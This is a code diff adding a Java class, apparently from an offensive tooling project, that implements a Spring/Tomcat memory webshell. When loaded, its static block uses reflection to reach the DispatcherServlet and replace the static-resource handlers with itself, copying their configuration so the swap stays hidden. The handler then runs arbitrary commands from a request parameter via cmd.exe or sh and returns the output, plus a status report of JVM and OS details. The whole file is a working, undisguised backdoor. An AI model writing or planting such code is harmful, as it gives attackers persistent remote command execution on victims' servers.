@@ -1,0 +1,261 @@
+package com.m1yuu.m1yuu_tools.evilClass;
+
+import org.springframework.web.servlet.resource.ResourceHttpRequestHandler;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.*;
+import java.nio.charset.Charset;
+
+public class OnadeClass extends ResourceHttpRequestHandler {
+
+    @Override
+    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        String url = request.getRequestURI();
+        if (url.equals("/OnadeClass") || url.contains("/OnadeClass")) {
+            String cmd = request.getParameter("OnadeClass");
+            if (cmd != null && cmd.length() > 0) {
+                // 检查是否为status命令
+                if ("status".equals(cmd)) {
+                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                    String currentTime = sdf.format(new java.util.Date());
+                    Runtime runtime = Runtime.getRuntime();
+                    long totalMemory = runtime.totalMemory();
+                    long freeMemory = runtime.freeMemory();
+                    long usedMemory = totalMemory - freeMemory;
+                    long maxMemory = runtime.maxMemory();
+                    String status = "=== Memory Shell Status ===\n" +
+                            "Type: resource\n" +
+                            "Current Time: " + currentTime + "\n" +
+                            "Java Version: " + System.getProperty("java.version") + "\n" +
+                            "JVM Name: " + System.getProperty("java.vm.name") + "\n" +
+                            "JVM Version: " + System.getProperty("java.vm.version") + "\n" +
+                            "OS Name: " + System.getProperty("os.name") + "\n" +
+                            "OS Version: " + System.getProperty("os.version") + "\n" +
+                            "Total Memory: " + (totalMemory / 1024 / 1024) + " MB\n" +
+                            "Used Memory: " + (usedMemory / 1024 / 1024) + " MB\n" +
+                            "Free Memory: " + (freeMemory / 1024 / 1024) + " MB\n" +
+                            "Max Memory: " + (maxMemory / 1024 / 1024) + " MB\n" +
+                            "========================";
+                    response.getWriter().write(status);
+                    response.getWriter().flush();
+                    return;
+                }
+                
+                Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+                String result = "";
+                Process p;
+                if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+                    try {
+                        p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                } else {
+                    try {
+                        // 直接执行命令，不使用BASH_ENV重定向
+                        p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+
+                // 读取标准输出
+                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));
+                String line;
+                try {
+                    while ((line = br.readLine()) != null) {
+                        result = result + line + "\n";
+                    }
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                } finally {
+                    br.close();
+                }
+
+                // 读取错误输出
+                br = new BufferedReader(new InputStreamReader(p.getErrorStream(), osCharset));
+                try {
+                    while ((line = br.readLine()) != null) {
+                        result = result + line + "\n";
+                    }
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                } finally {
+                    br.close();
+                }
+                
+                // 写入回显并直接返回，不调用super.handleRequest，避免覆盖回显
+                try {
+                    response.getWriter().write(result);
+                    response.getWriter().flush();
+                    return; // 直接返回，不继续处理
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+        // 如果不是OnadeClass请求，调用父类方法正常处理
+        super.handleRequest(request, response);
+    }
+
+    static {
+        boolean hasReplacement = false;
+
+        try {
+            System.out.println("=== 替换所有HandlerMapping中的Map ===");
+
+            Thread currentThread = Thread.currentThread();
+            java.lang.reflect.Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
+            threadLocalsField.setAccessible(true);
+            Object threadLocalMap = threadLocalsField.get(currentThread);
+
+            java.lang.reflect.Field tableField = threadLocalMap.getClass().getDeclaredField("table");
+            tableField.setAccessible(true);
+            Object[] table = (Object[]) tableField.get(threadLocalMap);
+
+            for (Object entry : table) {
+                if (entry != null) {
+                    java.lang.reflect.Field valueField = entry.getClass().getDeclaredField("value");
+                    valueField.setAccessible(true);
+                    Object lambdaValue = valueField.get(entry);
+
+                    if (lambdaValue != null && lambdaValue.getClass().getName().contains("DispatcherServlet$$Lambda")) {
+                        java.lang.reflect.Field[] fields = lambdaValue.getClass().getDeclaredFields();
+                        for (java.lang.reflect.Field field : fields) {
+                            field.setAccessible(true);
+                            Object fieldValue = field.get(lambdaValue);
+
+                            if (fieldValue instanceof org.apache.catalina.connector.RequestFacade) {
+                                java.lang.reflect.Field requestField = fieldValue.getClass().getDeclaredField("request");
+                                requestField.setAccessible(true);
+                                org.apache.catalina.connector.Request request =
+                                        (org.apache.catalina.connector.Request) requestField.get(fieldValue);
+
+                                java.lang.reflect.Field filterChainField =
+                                        org.apache.catalina.connector.Request.class.getDeclaredField("filterChain");
+                                filterChainField.setAccessible(true);
+                                org.apache.catalina.core.ApplicationFilterChain filterChain =
+                                        (org.apache.catalina.core.ApplicationFilterChain) filterChainField.get(request);
+
+                                java.lang.reflect.Field servletField = filterChain.getClass().getDeclaredField("servlet");
+                                servletField.setAccessible(true);
+                                org.springframework.web.servlet.DispatcherServlet dispatcherServlet =
+                                        (org.springframework.web.servlet.DispatcherServlet) servletField.get(filterChain);
+
+                                java.lang.reflect.Field handlerMappingsField =
+                                        org.springframework.web.servlet.DispatcherServlet.class.getDeclaredField("handlerMappings");
+                                handlerMappingsField.setAccessible(true);
+                                java.util.List<org.springframework.web.servlet.HandlerMapping> handlerMappings =
+                                        (java.util.List<org.springframework.web.servlet.HandlerMapping>) handlerMappingsField.get(dispatcherServlet);
+
+                                // 找到SimpleUrlHandlerMapping
+                                for (org.springframework.web.servlet.HandlerMapping mapping : handlerMappings) {
+                                    if (mapping instanceof org.springframework.web.servlet.handler.SimpleUrlHandlerMapping) {
+                                        System.out.println("找到SimpleUrlHandlerMapping，替换所有Map");
+
+                                        org.springframework.web.servlet.handler.SimpleUrlHandlerMapping simpleMapping =
+                                                (org.springframework.web.servlet.handler.SimpleUrlHandlerMapping) mapping;
+
+                                        // 获取所有可能的Map字段名
+                                        String[] mapFieldNames = {"handlerMap", "urlMap", "pathPatternHandlerMap"};
+
+                                        for (String mapFieldName : mapFieldNames) {
+                                            java.lang.reflect.Field mapField = null;
+                                            Class<?> currentClass = simpleMapping.getClass();
+
+                                            while (currentClass != null) {
+                                                try {
+                                                    mapField = currentClass.getDeclaredField(mapFieldName);
+                                                    break;
+                                                } catch (NoSuchFieldException e) {
+                                                    currentClass = currentClass.getSuperclass();
+                                                }
+                                            }
+
+                                            if (mapField != null) {
+                                                mapField.setAccessible(true);
+                                                Object mapObj = mapField.get(simpleMapping);
+
+                                                if (mapObj instanceof java.util.Map) {
+                                                    java.util.Map<Object, Object> map = (java.util.Map<Object, Object>) mapObj;
+                                                    System.out.println("处理" + mapFieldName + "，大小: " + map.size());
+
+                                                    java.util.List<Object> keysToUpdate = new java.util.ArrayList<>();
+                                                    java.util.List<Object> newHandlers = new java.util.ArrayList<>();
+
+                                                    for (java.util.Map.Entry<Object, Object> mapEntry : map.entrySet()) {
+                                                        Object key = mapEntry.getKey();
+                                                        Object handler = mapEntry.getValue();
+
+                                                        System.out.println("  检查: " + key + " -> " + handler.getClass().getSimpleName());
+
+                                                        if (handler instanceof org.springframework.web.servlet.resource.ResourceHttpRequestHandler &&
+                                                                !(handler instanceof OnadeClass)) {
+
+                                                            System.out.println("  需要替换: " + key);
+
+                                                            OnadeClass maliciousHandler =
+                                                                    new OnadeClass();
+
+                                                            // 复制配置
+                                                            org.springframework.web.servlet.resource.ResourceHttpRequestHandler originalHandler =
+                                                                    (org.springframework.web.servlet.resource.ResourceHttpRequestHandler) handler;
+
+                                                            Class<?> handlerClass = org.springframework.web.servlet.resource.ResourceHttpRequestHandler.class;
+                                                            String[] configFields = {"resourceResolvers", "resourceTransformers", "locations", "locationValues"};
+
+                                                            for (String configFieldName : configFields) {
+                                                                try {
+                                                                    java.lang.reflect.Field configField = handlerClass.getDeclaredField(configFieldName);
+                                                                    configField.setAccessible(true);
+                                                                    Object configValue = configField.get(originalHandler);
+                                                                    if (configValue != null) {
+                                                                        configField.set(maliciousHandler, configValue);
+                                                                    }
+                                                                } catch (Exception e) {}
+                                                            }
+
+                                                            keysToUpdate.add(key);
+                                                            newHandlers.add(maliciousHandler);
+                                                            hasReplacement = true;
+                                                        }
+                                                    }
+
+                                                    // 批量更新
+                                                    for (int i = 0; i < keysToUpdate.size(); i++) {
+                                                        map.put(keysToUpdate.get(i), newHandlers.get(i));
+                                                        System.out.println(" " + mapFieldName + "替换成功: " + keysToUpdate.get(i));
+                                                    }
+                                                }
+                                            } else {
+                                                System.out.println("未找到字段: " + mapFieldName);
+                                            }
+                                        }
+
+                                        break; // 找到SimpleUrlHandlerMapping后退出
+                                    }
+                                }
+
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (hasReplacement) {
+                System.out.println("所有Map都已替换完成！");
+            } else {
+                System.out.println("未找到需要替换的Handler");
+            }
+
+        } catch (Exception e) {
+            System.out.println("替换异常: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+
+
+
+}
